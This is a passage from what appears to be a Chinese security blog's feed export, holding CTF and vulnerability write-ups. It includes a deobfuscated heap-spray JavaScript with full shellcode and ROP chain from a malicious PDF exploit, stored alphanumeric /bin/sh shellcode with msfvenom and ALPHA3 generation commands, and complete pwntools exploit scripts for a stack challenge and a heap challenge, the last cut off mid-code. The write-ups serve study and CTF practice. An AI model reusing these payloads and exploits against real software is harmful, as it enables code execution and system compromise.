class="number">0</span>;bMcIMXywogQMkNripedDmONNHXvwXPnOMatnpKwUSHuATHOcAzuvTnYIGldzmu&lt;<span class="number">0x1f0</span>;bMcIMXywogQMkNripedDmONNHXvwXPnOMatnpKwUSHuATHOcAzuvTnYIGldzmu++) kXBj[bMcIMXywogQMkNripedDmONNHXvwXPnOMatnpKwUSHuATHOcAzuvTnYIGldzmu]=vYpKSywUKtOzmIcaRAYPqZsGKRQBZeikke+<span class="string">"s"</span>;</span><br></pre></td></tr></table></figure><p>emm， msf生成的这个变量命名有点长啊，不过大概还是能看懂的，毕竟这种命名规范逆向都遇到过。。。<br>将他解成易懂的代码吧</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">unescape</span>( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud0d9%u74d9%uf424%u295b%ub1c9%ub831%ucdd3%ub89c%u4331%u0318%u1843%uc383%u2fd7%u4469%u2d3f%ub592%u52bf%u501a%u528e%u1078%u62a0%u740a%u084c%u6d5e%u7cc7%u8277%uca60%uada1%u6771%uac91%u7af1%u0ec6%ub4c8%u4e1b%ua80d%u02d6%ua6c6%ub345%uf263%u3855%u123f%uddde%u15f7%u73cf%u4f8c%u72cf%ue441%u6d46%uc186%u0611%ubd7c%ucea3%u3e4d%u2f0f%ucd62%u7751%u2e44%u8124%ud3b7%u563f%u0fca%u4db5%udb6c%uaa6d%u088d%u39eb%ue581%u657f%uf885%u1dac%u71b1%uf253%uc130%ud670%u9119%u4f19%u74c7%u8f25%u29a8%udb83%u3d44%u81be%uc002%ubc4c%uc260%ubf4e%uabd4%u347f%uacbb%u9f7f%u43f8%u82ca%ucba8%u5693%u91e9%u8d23%uac2d%u24a7%u4bcd%u4cb7%u10c8%ubc7f%u09a0%uc2ea%u2917%ua13f%ub9f6%u08a3%u399d%u5541'</span> );</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">unescape</span>( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span>(b.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">0x10000</span>) b+=b;</span><br><span class="line">c = b.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">c += a;</span><br><span class="line">c += b;</span><br><span class="line">d = c/substring(<span class="number">0</span>, <span class="number">0x10000</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(d.length &lt; <span class="number">0x80000</span>) d += d;</span><br><span class="line">e = d.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>)/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">0x1f0</span>; i++) array[i] = e + <span class="string">"s"</span></span><br></pre></td></tr></table></figure><p>我这命名规范别喷了。。。我也知道菜。不知道命名成啥<br>b就是0x0C0C0C0C,滑板来的，代码就是or al,0x0c,这种滑板<br>emm</p><p>顺便分析下吧，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(b.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">0x10000</span>) b+=b;</span><br><span class="line">c = b.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">c += a;</span><br><span class="line">c += b;</span><br></pre></td></tr></table></figure><p>这部分，就是计算到1/10mb，这里以1/10mb为一个单元块，在减掉结构部分大小，加上shellcode<br>然后在填充8份</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(d.length &lt; <span class="number">0x80000</span>) d += d;</span><br><span class="line">e = d.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>)/<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>最后便是关键</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">0x1f0</span>; i++) array[i] = e + <span class="string">"s"</span></span><br></pre></td></tr></table></figure><p>这里是以0x80000为一个单位块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0x80000</span>*<span class="number">0x1f0</span>)</span><br><span class="line"><span class="string">'0xf800000'</span></span><br></pre></td></tr></table></figure><p>所以这里实际上早就超过了0x0C0C0C0C，所以只要ROP迁移到这里，就可以执行shellcode的了</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>假设给你一个恶意pdf，如何快速分析找到漏洞点？</li><li>如何进行修复</li></ol><p>第一个问题，我目前只会找敏感函数，所以暂时放着了</p><p>第二个修复部分，用strncat就可以了，带长度的，后面修复就是通过strncat加上动态分配，这样就没有栈溢出了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>我觉得难的部分还是pdf的构造。我不会构造这部分，emm</li><li>rop部分一样可以用ROPgadget获得<br>└──╼ $ROPgadget –binary icucnv36.dll | grep ‘add ebp’<br>0x4a805afc : add al, 0 ; add ebp, 0x1fc ; leave ; ret<br>0x4a82748c : add al, 0x75 ; add ebp, dword ptr [edx + 2] ; pop eax ; ret<br>0x4a8221c2 : add al, byte ptr [eax] ; add ebp, 0x104 ; leave ; ret 4<br>0x4a81fba6 : add al, byte ptr [eax] ; add ebp, 0x148 ; leave ; ret<br>0x4a81fe1a : add al, byte ptr [eax] ; add ebp, 0x160 ; leave ; ret<br>0x4a8225b1 : add al, byte ptr [eax] ; add ebp, 0x18c ; leave ; ret<br>0x4a82683d : add al, byte ptr [eax] ; add ebp, 0x394 ; leave ; ret<br>0x4a8241b7 : add al, byte ptr [eax] ; add ebp, 0x3a0 ; leave ; ret<br>0x4a825227 : add al, byte ptr [eax] ; add ebp, 0x60 ; leave ; ret<br>0x4a82038e : add al, byte ptr [eax] ; add ebp, 0x64 ; leave ; ret<br>0x4a825011 : add al, byte ptr [eax] ; add ebp, 0x6c ; leave ; ret<br>0x4a8239f5 : add al, byte ptr [eax] ; add ebp, 0x6c ; leave ; ret 0xc<br>0x4a82391a : add al, byte ptr [eax] ; add ebp, 0x70 ; leave ; ret 8<br>0x4a82536d : add al, byte ptr [eax] ; add ebp, 0x78 ; leave ; ret<br>0x4a8233a0 : add al, byte ptr [eax] ; add ebp, 0x84 ; leave ; ret<br>0x4a82365f : add al, byte ptr [eax] ; add ebp, 0x88 ; leave ; ret<br>0x4a825594 : add al, byte ptr [eax] ; add ebp, 0x90 ; leave ; ret<br>0x4a826235 : add al, byte ptr [eax] ; add ebp, 0xb0 ; leave ; ret<br>0x4a83892d : add byte ptr [eax], al ; add ebp, 0x18c ; leave ; ret 0xc<br>0x4a84126f : add byte ptr [eax], al ; add ebp, 0x210 ; leave ; ret<br>0x4a84040c : add byte ptr [eax], al ; add ebp, 0x398 ; leave ; ret 0x18<br>0x4a83bf56 : add byte ptr [eax], al ; add ebp, 0x474 ; leave ; ret<br>0x4a841791 : add byte ptr [eax], al ; add ebp, 0x60 ; leave ; ret<br>0x4a83989a : add byte ptr [eax], al ; add ebp, 0x64 ; leave ; ret 0x14<br>0x4a83909d : add byte ptr [eax], al ; add ebp, 0xc0 ; leave ; ret 4<br>0x4a827f19 : add dword ptr [eax], eax ; add ebp, 0x17c ; leave ; ret<br>0x4a828f1f : add dword ptr [eax], eax ; add ebp, 0x1cb4 ; leave ; ret<br>0x4a82b5f2 : add dword ptr [eax], eax ; add ebp, 0x264 ; leave ; ret 0xc<br>0x4a82b10e : add dword ptr [eax], eax ; add ebp, 0x40c ; leave ; ret 0x18</li><li>至于攻击过程，这是以前洞的一个常见思路，创建临时文件，然后内存映射，最后复制shellcode</li><li>pdf构造可以参考 参考链接中的安全客师傅发的</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2VydC1pc3QuY29tL3B1YmxpYy9lbi9TT19kZXRhaWw/Y29kZT1tYWxpY2lvdXNfcGRm" title="https://www.cert-ist.com/public/en/SO_detail?code=malicious_pdf">深入浅出讲pdf恶意文档<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZGllcnN0ZXZlbnMuY29tLzIwMDgvMDQvMjkvcGRmLWxldC1tZS1jb3VudC10aGUtd2F5cy8=" title="https://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/">PDF, Let Me Count the Ways…<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTc5NjgxI2gyLTY=" title="https://www.anquanke.com/post/id/179681#h2-6">安全客师傅分析<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/78c3679c/">https://noone-hub.github.io/posts/78c3679c/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>实战</category>
      </categories>
      <tags>
        <tag>pwn， 漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/posts/8002891b/</url>
    <content><![CDATA[<h1 id="纯字母数字shellcode存放"><a href="#纯字母数字shellcode存放" class="headerlink" title="纯字母数字shellcode存放"></a>纯字母数字shellcode存放</h1><h2 id="x64-shellcode"><a href="#x64-shellcode" class="headerlink" title="x64 shellcode"></a>x64 shellcode</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">'PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA'</span></span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9oYW1hLmhhdGVuYWRpYXJ5LmpwL2VudHJ5LzIwMTcvMDQvMDQvMTkwMTI5" title="https://hama.hatenadiary.jp/entry/2017/04/04/190129">文章地址<i class="fa fa-external-link"></i></span></p><h2 id="x86-shellcode"><a href="#x86-shellcode" class="headerlink" title="x86 shellcode"></a>x86 shellcode</h2><p>msf生成命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/<span class="built_in">exec</span> CMD=<span class="string">"/bin/sh"</span> -e x86/alpha_upper BufferRegister=eax</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBJTK0XZ9V2U62HFMBCMYJGRHFORSE8EP2HFO3R3YBNLIJC1BZHDHS05PS06ORB2IRNFOT3RH30PWF3MYKQXMK0AA'</span></span><br></pre></td></tr></table></figure><h2 id="alpha3工具生成"><a href="#alpha3工具生成" class="headerlink" title="alpha3工具生成"></a>alpha3工具生成</h2><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>sc.bin可以从pwntools里的shellcraft.sh生成，或者其他途径</p><p>linux下无法运行，将ALPHA3.py的import test这个test删掉就行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python shellcode.py &gt; sc.bin</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">"sc.bin"</span> &gt; out.bin</span><br></pre></td></tr></table></figure><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python ./ALPHA3.py x86 ascii uppercase eax --input=<span class="string">"sc.bin"</span> &gt; out.bin</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/8002891b/">https://noone-hub.github.io/posts/8002891b/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>shellcode</category>
      </categories>
  </entry>
  <entry>
    <title>funny-stack</title>
    <url>/posts/d70e4493/</url>
    <content><![CDATA[<h1 id="有趣的栈题目"><a href="#有趣的栈题目" class="headerlink" title="有趣的栈题目"></a>有趣的栈题目</h1><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_80486EC();</span><br><span class="line">  sub_80485E7();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80486EC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+1Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter your name "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%9s"</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome %s to participate the 429 ctf!\n"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80485E7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> s[<span class="number">13</span>]; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter index"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter value"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    s[v1] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"your input"</span>);</span><br><span class="line">  v3 = fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, s[j]);</span><br><span class="line">    v3 = fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看上去流程挺简单的，开头有个off-by-one，接下来一个负数修改，思路大概就是降低第二个函数的栈帧，然后通过负数修改i,修改次数，在修改地址</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./pwn1'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_addr</span><span class="params">(i, addr)</span>:</span></span><br><span class="line">    sla(<span class="string">"enter index\n"</span>, str(i))</span><br><span class="line">    sla(<span class="string">"enter value\n"</span>, str(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    gdb.attach(io, '''</span></span><br><span class="line"><span class="string">               b *0x080486ea</span></span><br><span class="line"><span class="string">               c</span></span><br><span class="line"><span class="string">               c</span></span><br><span class="line"><span class="string">               ''')</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    sa(<span class="string">"Enter your name \n"</span>, <span class="string">"c"</span>*<span class="number">0x9</span>)</span><br><span class="line">    num = <span class="number">-44</span></span><br><span class="line">    backdoor = <span class="number">0x0804875D</span></span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    __libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    addr = <span class="number">0x80485E7</span></span><br><span class="line">    pack_addr(<span class="number">-1</span>, <span class="number">-34</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">43</span>):</span><br><span class="line">        pack_addr(num+i, backdoor)</span><br><span class="line">    ru(<span class="string">"0 0 0 0 0 0 0 0 0 0 "</span>)</span><br><span class="line">    r()</span><br><span class="line">    <span class="comment">#pack_addr(num+0xb, puts_plt)</span></span><br><span class="line">    <span class="comment">#pack_addr(num+0xc, main_addr)</span></span><br><span class="line">    <span class="comment">#pack_addr(num+0xd, __libc_start_main)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/d70e4493/">https://noone-hub.github.io/posts/d70e4493/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>unctf</title>
    <url>/posts/89fa1574/</url>
    <content><![CDATA[<h1 id="unctf2019-pwn部分题解"><a href="#unctf2019-pwn部分题解" class="headerlink" title="unctf2019 pwn部分题解"></a>unctf2019 pwn部分题解</h1><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>easy，不讲了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.spk5nTEvta/1910245db1406d3eedd'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">"Plz input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Plz input index: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Plz input size: "</span>, str(size))</span><br><span class="line">    sa(<span class="string">"Plz input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Plz input index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">"Plz input index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"a"</span>*<span class="number">0x18</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    r(<span class="number">0x18</span>)</span><br><span class="line">    puts = uu64(r(<span class="number">6</span>))</span><br><span class="line">    